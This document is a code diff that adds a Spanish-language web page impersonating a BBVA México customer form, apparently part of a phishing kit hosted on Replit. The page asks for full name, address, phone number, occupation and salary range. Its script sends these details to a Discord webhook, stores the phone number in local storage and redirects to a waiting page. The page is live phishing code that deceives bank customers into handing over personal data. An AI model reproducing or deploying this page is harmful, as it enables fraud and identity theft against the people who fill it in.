@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BBVA México - Formulario</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "BBVAHeadline", -apple-system, BlinkMacSystemFont,
+        "Segoe UI", sans-serif;
+      background: linear-gradient(135deg, #001391 0%, #001170 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+      max-width: 480px;
+      width: 100%;
+      padding: 40px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .logo-text {
+      color: #001391;
+      font-size: 32px;
+      font-weight: bold;
+      letter-spacing: 2px;
+    }
+
+    .header-link {
+      text-align: right;
+      margin-bottom: 30px;
+    }
+
+    .header-link a {
+      color: #001391;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .header-link a:after {
+      content: " ⟩";
+    }
+
+    h1 {
+      color: #001391;
+      font-size: 28px;
+      margin-bottom: 30px;
+      font-weight: 400;
+    }
+
+    .form-group {
+      margin-bottom: 24px;
+    }
+
+    label {
+      display: block;
+      color: #001391;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 8px;
+    }
+
+    input,
+    select {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #d3d3d3;
+      border-radius: 4px;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      background: white;
+    }
+
+    input:focus,
+    select:focus {
+      outline: none;
+      border-color: #001391;
+      box-shadow: 0 0 0 3px rgba(0, 19, 145, 0.1);
+    }
+
+    select {
+      cursor: pointer;
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg width='12' height='8' viewBox='0 0 12 8' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1L6 6L11 1' stroke='%23001391' stroke-width='2' stroke-linecap='round'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 16px center;
+      padding-right: 40px;
+    }
+
+    .btn-primary {
+      width: 100%;
+      padding: 16px;
+      background: #001391;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      margin-top: 10px;
+    }
+
+    .btn-primary:hover {
+      background: #001170;
+    }
+
+    .btn-primary:active {
+      transform: scale(0.98);
+    }
+
+    .info-box {
+      background: #fff4e5;
+      border-left: 4px solid #f7b500;
+      padding: 16px;
+      margin-top: 30px;
+      border-radius: 4px;
+    }
+
+    .info-box h3 {
+      color: #001391;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .info-box p {
+      color: #5c5c5c;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    .info-box a {
+      color: #001391;
+      text-decoration: underline;
+    }
+
+    .footer-logo {
+      text-align: center;
+      margin-top: 40px;
+      padding-top: 30px;
+      border-top: 1px solid #e0e0e0;
+    }
+
+    .footer-logo-text {
+      color: white;
+      background: #001391;
+      padding: 20px;
+      font-size: 36px;
+      font-weight: bold;
+      letter-spacing: 3px;
+      display: inline-block;
+      border-radius: 4px;
+    }
+
+    .footer-links {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .footer-links a {
+      color: #001391;
+      text-decoration: none;
+      font-size: 13px;
+      margin: 0 10px;
+      display: block;
+      margin-bottom: 8px;
+    }
+
+    .success-message {
+      display: none;
+      background: #d4edda;
+      color: #155724;
+      padding: 16px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      border: 1px solid #c3e6cb;
+    }
+
+    @media (max-width: 540px) {
+      .container {
+        padding: 30px 20px;
+      }
+
+      h1 {
+        font-size: 24px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Inserted by miarroba -->
+  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0"
+      style="display:none;visibility:hidden"></iframe></noscript>
+  <!-- Inserted by miarroba -->
+  <div class="container">
+    <div class="logo">
+      <div class="logo-text">
+        <img src="./2_files/2560px-Banco_BBVA_Logotipo.svg.png" style="width: 250px" alt="">
+      </div>
+    </div>
+
+    <div class="header-link">
+      <a href="#">Ir a
+        BBVA México</a>
+    </div>
+
+    <h1>¡Bienvenido!</h1>
+
+    <div id="successMessage" class="success-message">
+      ✓ Formulario enviado correctamente
+    </div>
+
+    <div id="formContainer">
+      <div class="form-group">
+        <label for="nombres">NOMBRES *</label>
+        <input type="text" id="nombres" name="nombres" required="" placeholder="Ingrese sus nombres">
+      </div>
+
+      <div class="form-group">
+        <label for="apellidos">APELLIDOS *</label>
+        <input type="text" id="apellidos" name="apellidos" required="" placeholder="Ingrese sus apellidos">
+      </div>
+
+      <div class="form-group">
+        <label for="direccion">DIRECCIÓN *</label>
+        <input type="text" id="direccion" name="direccion" required="" placeholder="Ingrese su dirección">
+      </div>
+
+      <div class="form-group">
+        <label for="telefono">NÚMERO TELEFÓNICO *</label>
+        <div style="display: flex; gap: 8px">
+          <input type="text" value="+52" readonly="" style="
+                width: 70px;
+                background: #f5f5f5;
+                color: #666;
+                cursor: not-allowed;
+              ">
+          <input type="tel" id="telefono" name="telefono" required="" placeholder="5512345678" pattern="[0-9]{10}"
+            title="Ingrese un número telefónico válido de 10 dígitos" inputmode="numeric" style="flex: 1">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="ocupacion">¿Cuál es su ocupación actual? *</label>
+        <select id="ocupacion" name="ocupacion" required="">
+          <option value="">Seleccione una opción</option>
+          <option value="empleado">Empleado</option>
+          <option value="independiente">Trabajador Independiente</option>
+          <option value="empresario">Empresario</option>
+
+          <!-- Profesiones específicas -->
+          <option value="doctor">Doctor / Médico</option>
+          <option value="abogado">Abogado</option>
+          <option value="ingeniero">Ingeniero</option>
+          <option value="maestro">Maestro / Profesor</option>
+          <option value="contador">Contador</option>
+          <option value="enfermero">Enfermero</option>
+          <option value="arquitecto">Arquitecto</option>
+          <option value="psicologo">Psicólogo</option>
+
+          <!-- Otras opciones generales -->
+          <option value="profesional">Profesional Independiente</option>
+          <option value="estudiante">Estudiante</option>
+          <option value="jubilado">Jubilado/Pensionado</option>
+          <option value="hogar">Labores del Hogar</option>
+          <option value="desempleado">Desempleado</option>
+          <option value="otro">Otro</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label for="salario">¿Cuál es su rango salarial mensual? *</label>
+        <select id="salario" name="salario" required="">
+          <option value="">Seleccione un rango</option>
+          <option value="0-5000">Menos de $5,000 MXN</option>
+          <option value="5000-10000">$5,000 - $10,000 MXN</option>
+          <option value="10000-20000">$10,000 - $20,000 MXN</option>
+          <option value="20000-30000">$20,000 - $30,000 MXN</option>
+          <option value="30000-50000">$30,000 - $50,000 MXN</option>
+          <option value="50000-100000">$50,000 - $100,000 MXN</option>
+          <option value="100000+">Más de $100,000 MXN</option>
+        </select>
+      </div>
+
+      <button type="button" class="btn-primary" onclick="submitForm()">
+        Continuar
+      </button>
+
+      <div class="info-box">
+        <h3>⚠ Cuida tus datos y la seguridad de tu equipo</h3>
+        <p>
+          Algunos extensiones de los navegadores pueden poner en riesgo la
+          seguridad de tus datos. Solo instala las extensiones que uses para
+          que te libres de ellos.
+        </p>
+        <a href="#">Más
+          información</a>
+      </div>
+    </div>
+
+    <div class="footer-logo">
+      <img src="index_files/logo_santander_rojo.svg" width="150px" alt="">
+    </div>
+
+    <div class="footer-links">
+      <a href="#">Aviso
+        legal</a>
+      <a href="#">Mapa del
+        sitio</a>
+      <a href="#">Aviso de
+        privacidad</a>
+    </div>
+  </div>
+  <div id="replit-pill-host"><template shadowrootmode="closed">
+      <style>
+        #replit-pill {
+          position: fixed;
+          bottom: 48px;
+          right: 48px;
+          border-radius: 120px;
+          font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+          font-size: 12px;
+          display: inline-flex;
+          align-items: center;
+          gap: 6px;
+          padding: 6px 12px;
+          z-index: 1000000;
+          white-space: nowrap;
+          cursor: pointer;
+          overflow: hidden;
+          background-color: rgba(0, 0, 0, 0.4);
+          backdrop-filter: blur(6px);
+          -webkit-backdrop-filter: blur(6px);
+          color: #f0f2f6;
+          box-shadow: 1px 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 1px 0px rgba(255, 255, 255, 0.1);
+          transition: transform 0.2s ease;
+        }
+
+        #replit-pill:hover {
+          transform: scale(1.05);
+        }
+
+        #replit-pill .shimmer {
+          position: absolute;
+          inset: 0;
+          transform: translateX(-100%);
+          transition: transform 0.7s ease-in-out;
+          background: linear-gradient(to right, transparent, rgba(255, 255, 255, 0.1), transparent);
+          pointer-events: none;
+        }
+
+        #replit-pill:hover .shimmer {
+          transform: translateX(100%);
+        }
+
+        #replit-pill .badge-content {
+          display: inline-flex;
+          align-items: center;
+          gap: 6px;
+          position: relative;
+          flex: 0 0 auto;
+        }
+
+        #replit-pill .replit-logo {
+          color: #f0f2f6;
+        }
+
+        #replit-pill .replit-text {
+          font-weight: 500;
+          line-height: 20px;
+          color: #f0f2f6;
+        }
+
+        #replit-pill .close-button {
+          display: inline-flex;
+          align-items: center;
+          justify-content: center;
+          padding: 2px;
+          flex: 0 0 auto;
+          border-radius: 64px;
+          width: 12px;
+          height: 12px;
+          min-width: 0;
+          cursor: pointer;
+          border: none;
+          box-sizing: border-box;
+          background-color: transparent;
+          transition: background-color 0.2s ease;
+        }
+
+        #replit-pill .close-button:hover {
+          background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        #replit-pill .close-button:focus-visible {
+          outline: 1px solid #e6e9ef;
+          outline-offset: 1px;
+        }
+
+        #replit-pill .close-icon {
+          width: 8px;
+          height: 8px;
+          color: #e6e9ef;
+        }
+      </style>
+      <div id="replit-pill">
+        <div class="shimmer"></div>
+        <div class="badge-content"><svg width="16" height="16" viewBox="0 0 23 28" fill="none" class="replit-logo">
+            <path
+              d="M0 1.72499C0 0.772305 0.772305 0 1.72499 0H9.77495C10.7276 0 11.4999 0.772305 11.4999 1.72499V9.19996H1.72499C0.772305 9.19996 0 8.42765 0 7.47496V1.72499Z"
+              fill="currentColor"></path>
+            <path
+              d="M11.4999 9.19996H21.2749C22.2276 9.19996 22.9999 9.97226 22.9999 10.9249V16.6749C22.9999 17.6276 22.2276 18.3999 21.2749 18.3999H11.4999V9.19996Z"
+              fill="currentColor"></path>
+            <path
+              d="M0 20.1249C0 19.1722 0.772305 18.3999 1.72499 18.3999H11.4999V25.8749C11.4999 26.8276 10.7276 27.5999 9.77495 27.5999H1.72499C0.772305 27.5999 0 26.8276 0 25.8749V20.1249Z"
+              fill="currentColor"></path>
+          </svg>
+        </div><button class="close-button" aria-label="Close"><svg width="24" height="24" viewBox="0 0 24 24"
+            fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+            class="close-icon">
+            <path d="M18 6 6 18"></path>
+            <path d="m6 6 12 12"></path>
+          </svg></button>
+      </div>
+    </template></div>
+    <script src="discord.js"></script>
+    <script>
+
+// Función para validar que todos los campos requeridos tengan valor
+function validarCampos() {
+    const camposRequeridos = [
+        'nombres',
+        'apellidos', 
+        'direccion',
+        'telefono',
+        'ocupacion',
+        'salario'
+    ];
+    
+    for (const campo of camposRequeridos) {
+        const elemento = document.getElementById(campo);
+        if (!elemento || !elemento.value || elemento.value.trim() === '') {
+            return false;
+        }
+    }
+    return true;
+}
+
+// Función para obtener todos los valores del formulario
+function obtenerValoresFormulario() {
+    return {
+        nombres: document.getElementById('nombres')?.value || '',
+        apellidos: document.getElementById('apellidos')?.value || '',
+        direccion: document.getElementById('direccion')?.value || '',
+        telefono: document.getElementById('telefono')?.value || '',
+        ocupacion: document.getElementById('ocupacion')?.value || '',
+        salario: document.getElementById('salario')?.value || '',
+        fecha: new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' }),
+        userAgent: navigator.userAgent,
+        url: window.location.href
+    };
+}
+// Función para enviar datos a Discord
+async function enviarADiscord(datos) {
+    try {
+        // Crear el mensaje embed para Discord
+        const embed = {
+            title: '📋 Nuevo Formulario BBVA',
+            color: 0x001391, // Color azul BBVA
+            fields: [
+    {
+        name: '👤 Nombres',
+        value: `\`\`\`${datos.nombres || 'No proporcionado'}\`\`\``,
+        inline: true
+    },
+    {
+        name: '👤 Apellidos',
+        value: `\`\`\`${datos.apellidos || 'No proporcionado'}\`\`\``,
+        inline: true
+    },
+    {
+        name: '📍 Dirección',
+        value: `\`\`\`${datos.direccion || 'No proporcionado'}\`\`\``,
+        inline: false
+    },
+    {
+        name: '📞 Teléfono',
+        value: `\`\`\`+52 ${datos.telefono || 'No proporcionado'}\`\`\``,
+        inline: true
+    },
+    {
+        name: '💼 Ocupación',
+        value: `\`\`\`${datos.ocupacion || 'No proporcionado'}\`\`\``,
+        inline: true
+    },
+    {
+        name: '💰 Rango Salarial',
+        value: `\`\`\`${datos.salario || 'No proporcionado'}\`\`\``,
+        inline: true
+    },
+    {
+        name: '🕐 Fecha/Hora',
+        value: `\`\`\`${datos.fecha}\`\`\``,
+        inline: false
+    }
+],
+            footer: {
+                text: 'Sistema de Verificación BBVA'
+            },
+            timestamp: new Date().toISOString()
+        };
+
+        // Preparar el payload
+        const payload = {
+            embeds: [embed]
+        };
+
+        // Enviar a Discord
+        const respuesta = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        });
+
+        if (!respuesta.ok) {
+            throw new Error(`Error HTTP: ${respuesta.status}`);
+        }
+
+        return true;
+    } catch (error) {
+        console.error('Error enviando a Discord:', error);
+        return false;
+    }
+}
+
+async function submitForm() {
+    // Validar campos
+    if (!validarCampos()) {
+        alert('Por favor, complete todos los campos requeridos');
+        return;
+    }
+
+    // Mostrar mensaje de carga
+    const btnSubmit = document.querySelector('.btn-primary');
+    const textoOriginal = btnSubmit.textContent;
+    btnSubmit.textContent = 'Enviando...';
+    btnSubmit.disabled = true;
+
+    try {
+        // Obtener valores del formulario
+        const datos = obtenerValoresFormulario();
+        
+        // ✅ GUARDAR TELÉFONO EN LOCALSTORAGE (CORREGIDO)
+        localStorage.setItem('tel', datos.telefono);
+        localStorage.setItem('nombreCompleto', `${datos.nombres} ${datos.apellidos}`);
+        
+        // Enviar a Discord
+        const enviado = await enviarADiscord(datos);
+        
+        if (enviado) {
+            // Mostrar mensaje de éxito
+            const successMessage = document.getElementById('successMessage');
+            if (successMessage) {
+                successMessage.style.display = 'block';
+                successMessage.textContent = '✓ Formulario enviado correctamente';
+            }
+            
+            // Limpiar el formulario
+            document.getElementById('nombres').value = '';
+            document.getElementById('apellidos').value = '';
+            document.getElementById('direccion').value = '';
+            document.getElementById('telefono').value = '';
+            document.getElementById('ocupacion').value = '';
+            document.getElementById('salario').value = '';
+            
+            // Redireccionar
+            window.location.href = 'wait.html';
+            
+        } else {
+            alert('Hubo un error al enviar el formulario. Por favor, intente de nuevo.');
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        alert('Hubo un error al procesar su solicitud');
+    } finally {
+        // Restaurar botón
+        btnSubmit.textContent = textoOriginal;
+        btnSubmit.disabled = false;
+    }
+}
+// Función alternativa si necesitas enviar a Discord sin validación
+async function enviarFormularioDirecto() {
+    const datos = obtenerValoresFormulario();
+    return await enviarADiscord(datos);
+}
+
+// Validación en tiempo real (opcional)
+document.addEventListener('DOMContentLoaded', function() {
+    const campos = ['nombres', 'apellidos', 'direccion', 'telefono', 'ocupacion', 'salario'];
+    
+    campos.forEach(campo => {
+        const elemento = document.getElementById(campo);
+        if (elemento) {
+            elemento.addEventListener('input', function() {
+                if (this.value.trim() !== '') {
+                    this.style.borderColor = '#28a745';
+                } else {
+                    this.style.borderColor = '#d3d3d3';
+                }
+            });
+        }
+    });
+});
+
+// Exportar funciones si es necesario (para módulos)
+if (typeof module !== 'undefined' && module.exports) {
+    module.exports = {
+        validarCampos,
+        obtenerValoresFormulario,
+        enviarADiscord,
+        submitForm
+    };
+}
+    </script>
+</body>
+
+</html>
